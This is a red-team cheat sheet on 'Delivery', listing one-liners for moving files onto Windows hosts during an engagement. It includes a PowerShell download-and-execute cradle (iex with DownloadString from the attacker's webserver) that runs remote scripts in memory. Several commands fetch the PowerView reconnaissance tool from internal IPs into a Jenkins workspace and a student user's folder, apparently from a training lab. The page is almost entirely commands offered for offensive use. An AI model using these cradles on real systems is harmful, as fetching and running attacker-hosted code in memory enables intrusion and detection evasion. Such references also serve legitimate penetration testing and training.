# Delivery

Yes. I know. Delivery is not on Mitre Att&ck Framework. However, downloading and uploading files is an absolute necessity during a Red Team engagement.

## Download Files

### Download and Run in Memory

```
powershell iex (New-Object Net.WebClient).DownloadString('http://<yourwebserver>/Invoke-PowerShellScript.ps1');Invoke-PowerShellScript -arg1 value -arg2 value
```

### Download from SMB

`Copy-Item -Source \\server\share\file -Destination C:\path\`

### Download in Powershell - WebClient

```
$WebClient = New-Object System.Net.WebClient
$WebClient.DownloadFile("https://www.contoso.com/file","C:\path\file")
```

### Download in Powershell - Easy Download
```
iwr ((New-Object Net.WebClient).DownloadString('http://172.16.100.87/PowerView.ps1'))
```

### Download with Invoke-WebRequest

```
Invoke-WebRequest -Uri "http://www.contoso.com" -OutFile "C:\path\file"
```

### Download with Wget

```
wget "http://www.contoso.com" -outfile "file"
```

### Download with Authentication

```
Invoke-WebRequest -Uri https://www.contoso.com/ -OutFile C:"\path\file" -Credential "yourUserName"
```

```
$WebClient = New-Object System.Net.WebClient
$WebClient.DownloadFile("http://172.16.99.87/PowerView.ps1","C:\Program Files (x86)\Jenkins\workspace\Project11\PowerView.ps1")
```

```
$WebClient = New-Object System.Net.WebClient
$WebClient.DownloadFile("http://172.16.99.87/PowerView.ps1","C:\Users\student487\Downloads\PowerView.ps1")



```

